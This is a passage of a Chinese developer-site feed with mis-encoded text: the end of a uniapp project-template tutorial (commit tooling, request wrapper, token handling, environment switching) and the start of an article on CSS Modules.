    <span class="hljs-attr">"*.{js,vue}"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"eslint --fix"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"prettier --write"</span><span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># .husky/pre-commit</span>
npx lint-staged
</code></pre>
<h4 data-id="heading-6">2.3 Commitizen + Commitlint</h4>
<p>è§„èŒƒæäº¤ä¿¡æ¯ï¼Œæ”¯æŒä¸­æ–‡æç¤ºã€‚</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D commitizen cz-customizable @commitlint/cli @commitlint/config-conventional
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// .cz-config.js</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">types</span>: [
    { <span class="hljs-attr">value</span>: <span class="hljs-string">'feat'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'âœ¨ feat:     æ–°åŠŸèƒ½'</span> },
    { <span class="hljs-attr">value</span>: <span class="hljs-string">'fix'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'ğŸ› fix:      ä¿®å¤bug'</span> },
    { <span class="hljs-attr">value</span>: <span class="hljs-string">'docs'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'ğŸ“ docs:     æ–‡æ¡£å˜æ›´'</span> },
    { <span class="hljs-attr">value</span>: <span class="hljs-string">'style'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'ğŸ’„ style:    ä»£ç æ ¼å¼'</span> },
    { <span class="hljs-attr">value</span>: <span class="hljs-string">'refactor'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'â™»ï¸ refactor: é‡æ„'</span> },
    { <span class="hljs-attr">value</span>: <span class="hljs-string">'perf'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'âš¡ perf:     æ€§èƒ½ä¼˜åŒ–'</span> },
    { <span class="hljs-attr">value</span>: <span class="hljs-string">'chore'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'ğŸ”§ chore:    æ„å»º/å·¥å…·å˜åŠ¨'</span> },
  ],
  <span class="hljs-attr">messages</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'é€‰æ‹©æäº¤ç±»å‹:'</span>,
    <span class="hljs-attr">subject</span>: <span class="hljs-string">'ç®€çŸ­æè¿°:'</span>,
    <span class="hljs-attr">confirmCommit</span>: <span class="hljs-string">'ç¡®è®¤æäº¤?'</span>,
  },
  <span class="hljs-attr">skipQuestions</span>: [<span class="hljs-string">'scope'</span>, <span class="hljs-string">'body'</span>, <span class="hljs-string">'breaking'</span>, <span class="hljs-string">'footer'</span>],
};
</code></pre>
<p>æäº¤æ—¶ä½¿ç”¨ <code>npx cz</code> æˆ– <code>pnpm run commit</code>ã€‚</p>
<hr/>
<h3 data-id="heading-7">ä¸‰ã€è¯·æ±‚å°è£…</h3>
<h4 data-id="heading-8">3.1 æ ¸å¿ƒåŠŸèƒ½</h4>
<ul>
<li>è‡ªåŠ¨æ‹¼æ¥ baseURL</li>
<li>è‡ªåŠ¨æ³¨å…¥ Token å’Œå…¬å…± Header</li>
<li>Loading ç®¡ç†ï¼ˆè®¡æ•°å™¨ï¼Œå¤šè¯·æ±‚ä¸é—ªçƒï¼‰</li>
<li>é”™è¯¯æç¤ºèŠ‚æµï¼ˆç›¸åŒé”™è¯¯ 1.5s å†…åªæç¤ºä¸€æ¬¡ï¼‰</li>
<li>è¯·æ±‚å–æ¶ˆï¼ˆé˜²ç«æ€ã€é¡µé¢å¸è½½æ—¶å–æ¶ˆï¼‰</li>
<li>é˜²é‡å¤è¯·æ±‚</li>
</ul>
<h4 data-id="heading-9">3.2 åŸºæœ¬ç”¨æ³•</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { http } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/core/request.js'</span>;

<span class="hljs-comment">// GET</span>
<span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> http.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/user/info'</span>, { <span class="hljs-attr">id</span>: <span class="hljs-number">123</span> });

<span class="hljs-comment">// POST</span>
<span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> http.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/user/update'</span>, { <span class="hljs-attr">name</span>: <span class="hljs-string">'å¼ ä¸‰'</span> });

<span class="hljs-comment">// é…ç½®é€‰é¡¹</span>
<span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> http.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/data'</span>, data, {
  <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>,         <span class="hljs-comment">// ä¸æ˜¾ç¤º loading</span>
  <span class="hljs-attr">showError</span>: <span class="hljs-literal">false</span>,       <span class="hljs-comment">// ä¸æ˜¾ç¤ºé”™è¯¯æç¤º</span>
  <span class="hljs-attr">cancelPrevious</span>: <span class="hljs-literal">true</span>,   <span class="hljs-comment">// å–æ¶ˆå‰ä¸€ä¸ªç›¸åŒè¯·æ±‚ï¼ˆæœç´¢åœºæ™¯ï¼‰</span>
});
</code></pre>
<h4 data-id="heading-10">3.3 è¯·æ±‚å–æ¶ˆ</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { onUnmounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> { http } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/core/request.js'</span>;

<span class="hljs-comment">// é¡µé¢å¸è½½æ—¶å–æ¶ˆè¯·æ±‚</span>
<span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> {
  http.<span class="hljs-title function_">cancelRequestsByUrl</span>(<span class="hljs-string">'/api/list'</span>);
});
</code></pre>
<h4 data-id="heading-11">3.4 ä¸šåŠ¡æ¥å£ç»„ç»‡</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/api/user.js</span>
<span class="hljs-keyword">import</span> { http } <span class="hljs-keyword">from</span> <span class="hljs-string">'./core/request.js'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> userApi = {
  <span class="hljs-attr">getInfo</span>: <span class="hljs-function">(<span class="hljs-params">params</span>) =&gt;</span> http.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/user/info'</span>, params),
  <span class="hljs-attr">update</span>: <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> http.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/user/update'</span>, data),
  <span class="hljs-attr">search</span>: <span class="hljs-function">(<span class="hljs-params">params</span>) =&gt;</span> http.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/user/search'</span>, params, { <span class="hljs-attr">cancelPrevious</span>: <span class="hljs-literal">true</span> }),
};
</code></pre>
<hr/>
<h3 data-id="heading-12">å››ã€Token ç®¡ç†</h3>
<h4 data-id="heading-13">4.1 åŠŸèƒ½ç‰¹æ€§</h4>
<ul>
<li>è‡ªåŠ¨åˆ·æ–°ï¼ˆå¯é…ç½®å¼€å…³ï¼‰</li>
<li>å¹¶å‘æ§åˆ¶ï¼ˆå¤šè¯·æ±‚åŒæ—¶è§¦å‘åˆ·æ–°åªæ‰§è¡Œä¸€æ¬¡ï¼‰</li>
<li>è¯·æ±‚é˜Ÿåˆ—ï¼ˆåˆ·æ–°æœŸé—´çš„è¯·æ±‚æ’é˜Ÿç­‰å¾…ï¼‰</li>
<li>é˜²é‡å¤è·³è½¬ç™»å½•é¡µ</li>
</ul>
<h4 data-id="heading-14">4.2 é…ç½®</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/config/token.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">AUTO_REFRESH_ENABLED</span> = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// æ˜¯å¦å¯ç”¨è‡ªåŠ¨åˆ·æ–°</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">BUFFER_TIME</span> = <span class="hljs-number">5</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>;   <span class="hljs-comment">// æå‰ 5 åˆ†é’Ÿåˆ·æ–°</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">REDIRECT_DELAY</span> = <span class="hljs-number">3000</span>;          <span class="hljs-comment">// é˜²é‡å¤è·³è½¬é—´éš”</span>
</code></pre>
<h4 data-id="heading-15">4.3 ä½¿ç”¨</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { tokenManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/auth/tokenManager.js'</span>;

<span class="hljs-comment">// ä¿å­˜ Token</span>
tokenManager.<span class="hljs-title function_">saveToken</span>({
  <span class="hljs-attr">accessToken</span>: <span class="hljs-string">'xxx'</span>,
  <span class="hljs-attr">refreshToken</span>: <span class="hljs-string">'yyy'</span>,
  <span class="hljs-attr">expiresTime</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() + <span class="hljs-number">7200000</span>,
});

<span class="hljs-comment">// æ£€æŸ¥ç™»å½•çŠ¶æ€</span>
<span class="hljs-keyword">if</span> (tokenManager.<span class="hljs-title function_">isLoggedIn</span>()) {
  <span class="hljs-comment">// å·²ç™»å½•</span>
}

<span class="hljs-comment">// æ¸…é™¤ Token</span>
tokenManager.<span class="hljs-title function_">clearToken</span>();
</code></pre>
<hr/>
<h3 data-id="heading-16">äº”ã€å¤šç¯å¢ƒåˆ‡æ¢</h3>
<h4 data-id="heading-17">5.1 ç¯å¢ƒé…ç½®</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># .env</span>
VITE_LOCAL_API_BASE_URL=http://localhost:3000
VITE_DEV_API_BASE_URL=https://api-dev.example.com
VITE_PROD_API_BASE_URL=https://api.example.com
</code></pre>
<h4 data-id="heading-18">5.2 åˆ‡æ¢æ–¹å¼</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ§åˆ¶å°æ‰§è¡Œï¼ˆä½“éªŒç‰ˆ/å¼€å‘ç‰ˆå¯ç”¨ï¼‰</span>
<span class="hljs-title function_">switchEnv</span>(<span class="hljs-string">'dev'</span>)    <span class="hljs-comment">// æµ‹è¯•ç¯å¢ƒ</span>
<span class="hljs-title function_">switchEnv</span>(<span class="hljs-string">'prod'</span>)   <span class="hljs-comment">// ç”Ÿäº§ç¯å¢ƒ</span>
<span class="hljs-title function_">switchEnv</span>(<span class="hljs-string">'local'</span>)  <span class="hljs-comment">// æœ¬åœ°ç¯å¢ƒ</span>
</code></pre>
<h4 data-id="heading-19">5.3 å®‰å…¨æœºåˆ¶</h4>
<p>çº¿ä¸Šæ­£å¼ç‰ˆè‡ªåŠ¨é”å®š prod ç¯å¢ƒï¼Œæ— æ³•åˆ‡æ¢ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">isReleaseVersion</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> accountInfo = wx.<span class="hljs-title function_">getAccountInfoSync</span>();
  <span class="hljs-keyword">return</span> accountInfo.<span class="hljs-property">miniProgram</span>?.<span class="hljs-property">envVersion</span> === <span class="hljs-string">'release'</span>;
}
</code></pre>
<hr/>
<h3 data-id="heading-20">å…­ã€é¡µé¢ç¼“å­˜</h3>
<p>è§£å†³å°ç¨‹åº URL å‚æ•°é•¿åº¦é™åˆ¶ï¼ˆçº¦ 2KBï¼‰ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { savePageCache, getPageCache, clearPageCache } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils/cache.js'</span>;

<span class="hljs-comment">// é¡µé¢ Aï¼šä¿å­˜æ•°æ®åè·³è½¬</span>
<span class="hljs-title function_">savePageCache</span>(<span class="hljs-string">'/pages/detail'</span>, { <span class="hljs-attr">orderId</span>: <span class="hljs-number">123</span>, <span class="hljs-attr">items</span>: [...] });
uni.<span class="hljs-title function_">navigateTo</span>({ <span class="hljs-attr">url</span>: <span class="hljs-string">'/pages/detail'</span> });

<span class="hljs-comment">// é¡µé¢ Bï¼šè·å–æ•°æ®</span>
<span class="hljs-keyword">const</span> data = <span class="hljs-title function_">getPageCache</span>(<span class="hljs-string">'/pages/detail'</span>);
<span class="hljs-title function_">clearPageCache</span>(<span class="hljs-string">'/pages/detail'</span>);  <span class="hljs-comment">// ç”¨å®Œæ¸…ç†</span>
</code></pre>
<hr/>
<h3 data-id="heading-21">ä¸ƒã€æ ·å¼ç®¡ç†</h3>
<h4 data-id="heading-22">7.1 SCSS å˜é‡</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// src/styles/variables.scss</span>
<span class="hljs-variable">$primary-color</span>: <span class="hljs-number">#007aff</span>;
<span class="hljs-variable">$text-color</span>: <span class="hljs-number">#333</span>;
<span class="hljs-variable">$border-color</span>: <span class="hljs-number">#eee</span>;
<span class="hljs-variable">$page-padding</span>: <span class="hljs-number">30</span>rpx;
</code></pre>
<h4 data-id="heading-23">7.2 å…¨å±€å¼•å…¥</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-attr">css</span>: {
  <span class="hljs-attr">preprocessorOptions</span>: {
    <span class="hljs-attr">scss</span>: {
      <span class="hljs-attr">additionalData</span>: <span class="hljs-string">'@import "@/styles/variables.scss";'</span>,
    },
  },
}
</code></pre>
<hr/>
<h3 data-id="heading-24">å…«ã€ä½¿ç”¨æ¨¡æ¿</h3>
<h4 data-id="heading-25">8.1 å…‹éš†é¡¹ç›®</h4>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/220529/uniapp-template.git my-project
<span class="hljs-built_in">cd</span> my-project
pnpm install
</code></pre>
<h4 data-id="heading-26">8.2 ä¿®æ”¹é…ç½®</h4>
<ol>
<li><code>.env</code> - ä¿®æ”¹ API åœ°å€</li>
<li><code>src/manifest.json</code> - ä¿®æ”¹å°ç¨‹åº appid</li>
<li><code>package.json</code> - ä¿®æ”¹é¡¹ç›®åç§°</li>
</ol>
<h4 data-id="heading-27">8.3 å¯åŠ¨å¼€å‘</h4>
<pre><code class="hljs language-bash" lang="bash">pnpm run dev:mp-weixin  <span class="hljs-comment"># å¾®ä¿¡å°ç¨‹åº</span>
pnpm run dev:h5         <span class="hljs-comment"># H5</span>
</code></pre>
<hr/>
<h3 data-id="heading-28">æ€»ç»“</h3>
<p>è¿™å¥—æ¨¡æ¿åŒ…å«äº†ä¼ä¸šçº§é¡¹ç›®å¸¸ç”¨çš„åŠŸèƒ½ï¼š</p>





























<table><thead><tr><th>æ¨¡å—</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>å·¥ç¨‹åŒ–</td><td>ESLint + Prettier + Husky + Commitizen</td></tr><tr><td>è¯·æ±‚å±‚</td><td>å°è£…ã€æ‹¦æˆªå™¨ã€å–æ¶ˆæœºåˆ¶ã€é˜²é‡å¤</td></tr><tr><td>è®¤è¯</td><td>Token ç®¡ç†ã€è‡ªåŠ¨åˆ·æ–°ã€å¹¶å‘æ§åˆ¶</td></tr><tr><td>ç¯å¢ƒ</td><td>å¤šç¯å¢ƒåˆ‡æ¢ã€çº¿ä¸Šé”å®š</td></tr><tr><td>å·¥å…·</td><td>é¡µé¢ç¼“å­˜ã€æ ·å¼å˜é‡</td></tr></tbody></table>
<p>å¼€ç®±å³ç”¨ï¼Œæ–°é¡¹ç›®ç›´æ¥åŸºäºæ¨¡æ¿å¼€å‘å³å¯ã€‚</p>
<hr/>
<p>å¦‚æœè§‰å¾—æœ‰å¸®åŠ©ï¼Œæ¬¢è¿ Star â­</p>
<hr/>
<blockquote>
<p>ğŸ“¦ é¡¹ç›®åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F220529%2Funiapp-template" target="_blank" title="https://github.com/220529/uniapp-template" ref="nofollow noopener noreferrer">github.com/220529/uniaâ€¦</a></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CSS Modulesï¼šç°ä»£å‰ç«¯ç»„ä»¶åŒ–æ ·å¼çš„å®‰å…¨è¾¹ç•Œ]]></title>    <link>https://juejin.cn/post/7592944032773324851</link>    <guid>https://juejin.cn/post/7592944032773324851</guid>    <pubDate>2026-01-09T05:25:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592944032773324851" data-draft-id="7592997693069344778" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" CSS Modulesï¼šç°ä»£å‰ç«¯ç»„ä»¶åŒ–æ ·å¼çš„å®‰å…¨è¾¹ç•Œ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-09T05:25:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ— æ•Œçš„æ‹–æ‹‰æ–¯æ—‹é£"/> <meta itemprop="url" content="https://juejin.cn/user/951508170179208"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             CSS Modulesï¼šç°ä»£å‰ç«¯ç»„ä»¶åŒ–æ ·å¼çš„å®‰å…¨è¾¹ç•Œ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/951508170179208/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ— æ•Œçš„æ‹–æ‹‰æ–¯æ—‹é£
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T05:25:44.000Z" title="Fri Jan 09 2026 05:25:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ Reactã€Vue ç­‰ç°ä»£å‰ç«¯æ¡†æ¶ç››è¡Œçš„æ—¶ä»£ï¼Œ <strong>â€œæ ·å¼æ±¡æŸ“â€</strong> Â æ›¾æ˜¯å›¢é˜Ÿåä½œä¸­æœ€ä»¤äººå¤´ç–¼çš„é—®é¢˜ä¹‹ä¸€ã€‚<br/>
ä¸€ä¸ªç®€å•çš„Â <code>.button</code>Â ç±»ï¼Œå¯èƒ½åœ¨ A ç»„ä»¶ä¸­æ˜¯è“è‰²åœ†è§’ï¼Œåœ¨ B ç»„ä»¶ä¸­å´æ˜¯çº¢è‰²æ–¹å—â€”â€”åªå› ä¸ºä¸¤ä¸ªå¼€å‘è€…â€œæ°å¥½â€ç”¨äº†ç›¸åŒçš„åå­—ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/544c3528509448f29c819ee8e6e320bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg5pWM55qE5ouW5ouJ5pav5peL6aOO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541143&amp;x-signature=gGpBZJTOJ2t1IE7eZoINRVXmtQE%3D" alt="css-demo.png" loading="lazy"/>
è€ŒÂ <strong>CSS Modules</strong>Â çš„å‡ºç°ï¼Œæ­£æ˜¯ä¸ºäº†è§£å†³è¿™ä¸€ç—›ç‚¹ï¼Œå®ƒç”¨ä¸€ç§ä¼˜é›…è€Œå¯é çš„æ–¹å¼ï¼Œä¸º CSS èµ‹äºˆäº†<strong>ç»„ä»¶çº§ä½œç”¨åŸŸï¼ˆScoped Stylesï¼‰</strong> Â çš„èƒ½åŠ›ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ä¼ ç»Ÿ CSS çš„å›°å¢ƒï¼šå…¨å±€æ±¡æŸ“ä¸å‘½åç„¦è™‘</h2>
<p>CSS æœ¬è´¨æ˜¯<strong>å…¨å±€ä½œç”¨åŸŸ</strong>çš„è¯­è¨€ï¼š</p>
<p>css</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* global.css */</span>
<span class="hljs-selector-class">.button</span> {
  <span class="hljs-attribute">background</span>: blue;
}
</code></pre>
<p>ä¸€æ—¦å¼•å…¥ï¼Œæ‰€æœ‰Â <code>&lt;button class="button"&gt;</code>Â éƒ½ä¼šè¢«å½±å“ã€‚<br/>
åœ¨å¤§å‹é¡¹ç›®ä¸­ï¼Œå¼€å‘è€…ä¸å¾—ä¸é‡‡ç”¨å„ç§â€œé˜²å¾¡æ€§å‘½åâ€ç­–ç•¥ï¼š</p>
<ul>
<li>BEM å‘½åæ³•ï¼š<code>.my-component__button--primary</code></li>
<li>å‰ç¼€çº¦å®šï¼š<code>.app-header-btn</code></li>
<li>æ·±å±‚åµŒå¥—ï¼š<code>.page .sidebar .nav .item</code></li>
</ul>
<p>è¿™ä¸ä»…å¢åŠ äº†å¿ƒæ™ºè´Ÿæ‹…ï¼Œè¿˜æ— æ³•ä»æ ¹æœ¬ä¸Šé¿å…å†²çªã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€CSS Modulesï¼šè®©æ ·å¼â€œç§æœ‰åŒ–â€</h2>
<p>CSS Modules æ˜¯ä¸€ç§<strong>å°† CSS æ–‡ä»¶ç¼–è¯‘ä¸º JavaScript å¯¹è±¡</strong>çš„æŠ€æœ¯ï¼Œæ ¸å¿ƒæ€æƒ³æ˜¯ï¼š</p>
<blockquote>
<p><strong>æ¯ä¸ªç±»ååœ¨æ„å»ºæ—¶è¢«è‡ªåŠ¨è½¬æ¢ä¸ºå…¨å±€å”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼ˆé€šå¸¸å¸¦å“ˆå¸Œï¼‰ï¼Œä»è€Œå®ç°æ ·å¼éš”ç¦»ã€‚</strong></p>
</blockquote>
<h3 data-id="heading-2">åŸºæœ¬ç”¨æ³•ï¼ˆä»¥ React ä¸ºä¾‹ï¼‰</h3>
<ol>
<li>
<p>åˆ›å»ºä¸€ä¸ªÂ <code>Button.module.css</code>Â æ–‡ä»¶ï¼š</p>
<p>css</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* Button.module.css */</span>
<span class="hljs-selector-class">.button</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">8px</span> <span class="hljs-number">16px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#007bff</span>;
  <span class="hljs-attribute">color</span>: white;
  <span class="hljs-attribute">border</span>: none;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
}
</code></pre>
</li>
<li>
<p>åœ¨ç»„ä»¶ä¸­å¯¼å…¥å¹¶ä½¿ç”¨ï¼š</p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Button.jsx</span>
<span class="hljs-keyword">import</span> styles <span class="hljs-keyword">from</span> <span class="hljs-string">'./Button.module.css'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Button</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.button}</span>&gt;</span>Click Me<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;
}
</code></pre>
</li>
